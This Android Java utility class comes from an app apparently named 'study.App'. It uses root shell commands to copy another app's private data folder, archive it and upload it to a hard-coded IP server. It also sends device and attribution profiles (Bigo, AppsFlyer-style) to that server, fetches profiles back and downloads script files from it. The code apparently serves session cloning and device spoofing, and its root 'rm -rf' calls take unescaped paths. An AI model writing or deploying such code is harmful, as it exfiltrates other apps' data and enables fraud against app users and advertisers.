package com.example.studyapp.task;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;
import com.example.studyapp.utils.MockTools;
import com.example.studyapp.utils.ShellUtils;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;


/**
 * @Time: 2025/6/16 11:11
 * @Creator: 初屿贤
 * @File: TaskUtil
 * @Project: study.App
 * @Description:
 */
public class TaskUtil {

  private static volatile DeviceInfo deviceInfo;
  private static volatile BigoInfo bigoDevice;
  private static volatile AfInfo afDevice;

  private static final String BASE_URL = "http://47.238.96.231:8112";
  private static OkHttpClient okHttpClient = new OkHttpClient.Builder()
      .connectTimeout(30, TimeUnit.SECONDS) // 连接超时
      .writeTimeout(60, TimeUnit.SECONDS)   // 写入超时 (对上传很重要)
      .readTimeout(30, TimeUnit.SECONDS)    // 读取超时
      .build();

  public static void postDeviceInfo(String androidId) {
    Log.i("TaskUtil", "postDeviceInfo called with androidId: " + androidId);

    if (okHttpClient == null) {
      Log.e("TaskUtil", "HttpClient is not initialized");
      throw new IllegalStateException("HttpClient is not initialized");
    }

    if (BASE_URL == null || BASE_URL.isEmpty()) {
      Log.e("TaskUtil", "BASE_URL is not initialized");
      throw new IllegalStateException("BASE_URL is not initialized");
    }

    Log.d("TaskUtil", "Creating payload for the request...");
    Payload payload = new Payload();
    payload.bigoDeviceObject = bigoDevice;
    payload.afDeviceObject = afDevice;
    payload.other = deviceInfo;

    Gson gson = new GsonBuilder().serializeNulls().create();
    String jsonRequestBody = gson.toJson(payload);

    Log.d("TaskUtil", "Request payload: " + jsonRequestBody);

    HttpUrl url = HttpUrl.parse(BASE_URL)
        .newBuilder()
        .addPathSegment("device_info_upload")
        .addQueryParameter("id", androidId)
        .build();

    Log.d("TaskUtil", "Request URL: " + url.toString());

    RequestBody body = RequestBody.create(MediaType.get("application/json; charset=utf-8"), jsonRequestBody);
    Log.d("TaskUtil", "Request body created");

    Request request = new Request.Builder()
        .url(url)
        .post(body)
        .build();

    Log.i("TaskUtil", "Starting network call...");
    try {
      Response response = okHttpClient.newCall(request).execute();
      try (ResponseBody responseBody = response.body()) {
        if (!response.isSuccessful()) {
          Log.e("TaskUtil", "Request failed with status: " + response.code() + ", message: " + response.message());
          return;
        }

        if (responseBody != null) {
          String responseText = responseBody.string();
          Log.i("TaskUtil", "Request succeeded. Response: " + responseText);
        } else {
          Log.e("TaskUtil", "Response body is null");
        }
      } catch (IOException e) {
        Log.e("TaskUtil", "Error while processing response: " + e.getMessage(), e);
      }
    } catch (IOException e) {
      Log.e("TaskUtil", "Network call failed: " + e.getMessage(), e);
    }
  }

  public static String getDeviceInfoSync(String androidId) {
    Log.d("TaskUtil", "getDeviceInfoSync called with androidId: " + androidId);

    validate(); // 检查 BASE_URL 和 okHttpClient 的合法性

    HttpUrl url = HttpUrl.parse(BASE_URL + "/device_info_download")
        .newBuilder()
        .addQueryParameter("androidId", androidId)
        .build();

    Log.d("TaskUtil", "Constructed URL for device info download: " + url.toString());

    Request request = new Request.Builder()
        .url(url)
        .get()
        .build();

    Log.d("TaskUtil", "Built HTTP request for device info download");

    try (Response response = okHttpClient.newCall(request).execute()) {
      // 检查响应是否成功
      if (!response.isSuccessful()) {
        String errorMessage = "Unexpected response: Code=" + response.code() +
            ", Message=" + response.message() +
            ", URL=" + url.toString();
        Log.e("TaskUtil", errorMessage);
        throw new IOException(errorMessage);
      }

      ResponseBody responseBody = response.body();
      if (responseBody != null) {
        String responseString = responseBody.string();
        Log.i("TaskUtil", "Received response: " + responseString);
        return responseString;
      } else {
        String errorMessage = "Response body is null: URL=" + url.toString();
        Log.e("TaskUtil", errorMessage);
        throw new IOException(errorMessage);
      }
    } catch (IOException e) {
      String errorMessage = "Error during HTTP request. URL=" + url.toString() +
          ", Android ID=" + androidId;
      Log.e("TaskUtil", errorMessage, e);
      e.printStackTrace();
      return null; // 或考虑在上层抛出异常
    }
  }

  public static void infoUpload(Context context, String androidId, String packAge) throws IOException {

    Log.i("TaskUtil", "infoUpload called with androidId: " + androidId + ", package: " + packAge);

    if (packAge == null || packAge.isEmpty()) {
      Log.e("TaskUtil", "Package name is null or empty");
      throw new IllegalArgumentException("Package name cannot be null or empty");
    }

    if (context == null) {
      Log.e("TaskUtil", "Context is null");
      throw new IllegalArgumentException("Context cannot be null");
    }

    if (androidId == null || androidId.isEmpty()) {
      Log.w("TaskUtil", "ANDROID_ID is null or empty");
      return;
    }

    String apkSourceDir = "/storage/emulated/0/Android/data/"+packAge;
    Log.d("TaskUtil", "APK source directory: " + apkSourceDir);

    File externalDir = context.getExternalFilesDir(null);
    if (externalDir == null) {
      Log.e("TaskUtil", "External storage directory is unavailable");
      throw new IOException("External storage directory is unavailable");
    }

    String outputZipPath = new File(externalDir, androidId + "_" + packAge + ".zip").getAbsolutePath();
    Log.d("TaskUtil", "Output ZIP path: " + outputZipPath);

    File zipFile = new File(outputZipPath);
    if (zipFile.exists()) {
     delFileSh(zipFile.getAbsolutePath());
    }
    File copiedDir = new File(context.getCacheDir(), packAge);
    if (copiedDir.exists()) {
      delFileSh(copiedDir.getAbsolutePath());
    }
    copyFolderSh(apkSourceDir, copiedDir.getAbsolutePath());
    boolean success = clearUpFileInDst(copiedDir);
    if (success){
      // 压缩APK文件
      zipSh(copiedDir, zipFile);
    }

    // 上传压缩文件
    if (!zipFile.exists()) {
      Log.w("TaskUtil", "Upload file does not exist: " + outputZipPath);
      return;
    }

    uploadFile(zipFile);

    // 清理临时文件
    delFileSh(copiedDir.getAbsolutePath());
    delFileSh(zipFile.getAbsolutePath());
  }

  public static void delFileSh(String path) {
    Log.i("TaskUtil", "start delFileSh : " + path);

    // 1. 参数校验
    if (path == null || path.isEmpty()) {
      Log.e("TaskUtil", "Invalid or empty path provided.");
      return;
    }
    File file = new File(path);
    if (!file.exists()) {
      Log.e("TaskUtil", "File does not exist: " + path);
      return;
    }

    // 3. 执行 Shell 命令
    try {
      String cmd = "rm -rf " + path;
      Log.i("TaskUtil", "Attempting to delete file using Shell command.");
      ShellUtils.execRootCmd(cmd);
      Log.i("TaskUtil", "File deletion successful for path: " + path);
    } catch (Exception e) {
      Log.e("TaskUtil", "Error occurred while deleting file: " + e.getMessage(), e);
    }
  }
  public static boolean copyFolderSh(String oldPath, String newPath) {
    Log.i("TaskUtil", "start copyFolderSh : " + oldPath + " ; " + newPath);
    try {
      // 验证输入路径合法性
      if (oldPath == null || newPath == null || oldPath.isEmpty() || newPath.isEmpty()) {
        Log.e("TaskUtil", "Invalid path. oldPath: " + oldPath + ", newPath: " + newPath);
        return false;
      }

      // 使用 File API 确保路径处理正确
      File src = new File(oldPath);
      File dst = new File(newPath);

      if (!src.exists()) {
        Log.e("TaskUtil", "Source path does not exist: " + oldPath);
        return false;
      }

      // 构造命令（注意 shell 特殊字符的转义）
      String safeOldPath = src.getAbsolutePath().replace(" ", "\\ ").replace("\"", "\\\"");
      String safeNewPath = dst.getAbsolutePath().replace(" ", "\\ ").replace("\"", "\\\"");
      String cmd = "cp -r -f \"" + safeOldPath + "\" \"" + safeNewPath + "\"";

      Log.i("TaskUtil", "copyFolderSh cmd: " + cmd);

      // 调用 MockTools 执行
      String result = ShellUtils.execRootCmdAndGetResult(cmd);
      if (result == null || result.trim().isEmpty()) {
        Log.e("TaskUtil", "Command execution failed. Result: " + result);
        return false;
      }

      Log.i("TaskUtil", "Command executed successfully: " + result);
      return true;
    } catch (Exception e) {
      Log.e("TaskUtil", "Error occurred during copyFolderSh operation", e);
      return false;
    }
  }


  private static final int BUFFER_SIZE = 1024 * 4;

  private static boolean clearUpFileInDst(File dst) {
    if (dst.exists()) {
      File[] files = dst.listFiles();
      if (files != null && files.length > 0) {
        for (File f : files) {
          if (f.isDirectory()) {
            if (!"cache".equalsIgnoreCase(f.getName())) {
//                                    f.delete();
              delFile(f);
            } else {
              Log.i("TaskUtil", "file need keep : " + f.getAbsolutePath());
            }
          } else {
            long fl = f.length();
            if (fl > 1024 * 1024 * 3) {
//                                    f.delete();
              delFile(f);
            } else {
              Log.i("TaskUtil", "file need keep : " + f.getAbsolutePath());
            }
          }
        }
      }
      return true ;
    }
    return false ;
  }



  private static void delFile(File file) {
    try {
      String cmd = "rm -rf " + file;
      Log.i("TaskUtil", "delFile-> cmd:" + cmd);
      ShellUtils.execRootCmd(cmd);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }


  public static void zipSh(File copyDir, File zipFile) {
    try {
      if (copyDir == null || zipFile == null || !copyDir.exists() || !zipFile.getParentFile().exists()) {
        throw new IllegalArgumentException("Invalid input directories or files.");
      }

      // 获取父目录并确保路径合法
      String parentDir = copyDir.getParentFile().getAbsolutePath().replace(" ", "\\ ").replace("\"", "\\\"");
      String zipFilePath = zipFile.getAbsolutePath().replace(" ", "\\ ").replace("\"", "\\\"");
      String copyDirName = copyDir.getName().replace(" ", "\\ ").replace("\"", "\\\"");

      // 构造命令
      String cmd = "cd " + parentDir + " && tar -zcvf " + zipFilePath + " " + copyDirName;

      Log.i("TaskUtil", "zipSh-> cmd:" + cmd.replace(parentDir, "[REDACTED]"));

      String result = ShellUtils.execRootCmdAndGetResult(cmd);

      if (result == null || result.contains("error")) {
        throw new IOException("Shell command execution failed: " + result);
      }
    } catch (Exception e) {
      Log.e("TaskUtil", "Error in zipSh", e);
    }
  }

  public static void uploadFile(File fileToUpload) throws IOException {
    Log.d("TaskUtil", "Preparing to upload file...");
    RequestBody fileBody = RequestBody.create(MediaType.get("application/zip"), fileToUpload);
    MultipartBody requestBody = new MultipartBody.Builder()
        .setType(MultipartBody.FORM)
        .addFormDataPart("file", fileToUpload.getName(), fileBody)
        .build();

    Request request = new Request.Builder()
        .url(BASE_URL + "/upload_package")
        .post(requestBody)
        .build();

    Log.i("TaskUtil", "Starting file upload to: " + BASE_URL + "/upload_package");

    try (Response response = okHttpClient.newCall(request).execute()) {
      ResponseBody body = response.body();
      if (response.isSuccessful() && body != null) {
        String responseBody = body.string();
        Log.i("TaskUtil", "File upload successful. Response: " + responseBody);
      } else {
        Log.w("TaskUtil", "File upload failed. Response: " + (response.message() != null ? response.message() : "Unknown"));
        if (body != null) {
          body.close();
        }
      }
    } catch (IOException e) {
      Log.e("TaskUtil", "File upload failed", e);
      throw e;
    }
  }

  private static void validate() {
    if (okHttpClient == null) {
      throw new IllegalStateException("HttpClient is not initialized");
    }
    if (BASE_URL == null || BASE_URL.isEmpty()) {
      throw new IllegalStateException("BASE_URL is not initialized");
    }
  }

  private static void infoDownload(String androidId) {
    // 下载压缩包
    HttpUrl url = HttpUrl.parse(BASE_URL + "/tar_info_download")
        .newBuilder()
        .addQueryParameter("file_name", "test")
        .build();

    Request request = new Request.Builder()
        .url(url)
        .get()
        .build();

    okHttpClient.newCall(request).enqueue(new Callback() {
      @Override
      public void onFailure(@NotNull Call call, @NotNull IOException e) {
        e.printStackTrace();
      }

      @Override
      public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()) {
          byte[] fileBytes = response.body().bytes();
          String savePath = "/storage/emulated/0/Download/test.zip";

          File file = new File(savePath);
          file.getParentFile().mkdirs();

          try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(fileBytes);
            System.out.println("File saved to " + savePath);
          } catch (IOException e) {
            e.printStackTrace();
          }
        } else {
          System.out.println("Download failed: " + response.message());
        }
      }
    });
  }

  public static File downloadCodeFile(String fileName) {
    String baseUrl = BASE_URL + "/download_code_file";
    String fullUrl = baseUrl + "?file_name=" + fileName;

    Request request = new Request.Builder()
        .url(fullUrl)
        .get()
        .build();

    try (Response response = okHttpClient.newCall(request).execute()) {
      if (response.isSuccessful() && response.body() != null) {
        File scriptDir = new File(Environment.getExternalStorageDirectory(), "script");
        if (!scriptDir.exists()) {
          scriptDir.mkdirs(); // 创建 script 目录
        }

        File saveFile = new File(scriptDir, fileName);

        try (InputStream is = response.body().byteStream();
            OutputStream os = new BufferedOutputStream(new FileOutputStream(saveFile))) {

          byte[] buffer = new byte[8192];
          int bytesRead;
          while ((bytesRead = is.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
          }

          Log.i("TaskUtil", "File saved to: " + saveFile.getAbsolutePath());
        }
        return saveFile;
      } else {
        Log.w("TaskUtil", "Download failed: HTTP code " + response.code());
        if (response.body() != null) {
          Log.e("TaskUtil", "Response body: " + response.body().string());
        }
        return null;
      }
    } catch (Exception e) {
      Log.e("TaskUtil", "Error downloading file", e);
      return null;
    }
  }

  public static String execQueryTask(String androidId) {
    return getDeviceInfoSync(androidId);
  }

  public static void execSaveTask(Context context, String androidId) {
    if (context == null) {
      throw new IllegalArgumentException("Context or Package name cannot be null or empty");
    }

    if (androidId == null || androidId.isEmpty()) {
      System.err.println("ANDROID_ID is null or empty");
      return;
    }

    try {
      postDeviceInfo(androidId);
    } catch (Exception e) {
      System.err.println("Error in execReloginTask: " + e.getMessage());
      e.printStackTrace();
    }
  }

  public static void setHttpClient(OkHttpClient client) {
    okHttpClient = client;
  }

  public static void setDeviceInfo(DeviceInfo info) {
    deviceInfo = info;
  }

  public static void setBigoDevice(BigoInfo info) {
    bigoDevice = info;
  }

  public static void setAfDevice(AfInfo info) {
    afDevice = info;
  }
}

class Payload {

  BigoInfo bigoDeviceObject;
  AfInfo afDeviceObject;
  DeviceInfo other;
}

